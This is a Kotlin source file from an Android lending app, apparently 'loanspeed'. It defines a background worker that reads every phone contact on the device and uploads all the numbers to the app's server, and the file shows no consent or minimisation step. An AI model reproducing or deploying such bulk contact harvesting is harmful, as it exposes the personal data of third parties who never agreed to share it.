package com.loanspeed.speed.util.workManager

import android.content.Context
import android.text.TextUtils
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import com.loanspeed.speed.CharmApplication
import com.loanspeed.speed.ext.createBody
import com.loanspeed.speed.model.PhoneModel
import com.loanspeed.speed.net.ApiServices
import com.loanspeed.speed.net.HttpManager
import com.loanspeed.speed.util.ContactUtil


/**
 * 通讯录数据
 */
class ContactsWM(context: Context, params: WorkerParameters) :
    CoroutineWorker(context, params) {
    private val mApiService by lazy { HttpManager.create(ApiServices::class.java) }

    override suspend fun doWork(): Result {
        try {
            val contactsList = ContactUtil.getContacts(CharmApplication.instance)
            val phoneList = ArrayList<PhoneModel>()
            for (contacts in contactsList){
                val phones = contacts.numbers
                if (phones.isNotEmpty()){
                    for (phoneBean in phones){
                        if (!TextUtils.isEmpty(phoneBean.phone)){
                            phoneList.add(phoneBean)
                        }
                    }
                }
            }

            val map = HashMap<String,Any>()
            map["list"] = phoneList
            mApiService.upContactsList(map.createBody())
            return Result.success()
        } catch (e: Exception) {
            return Result.failure()
        }

    }




}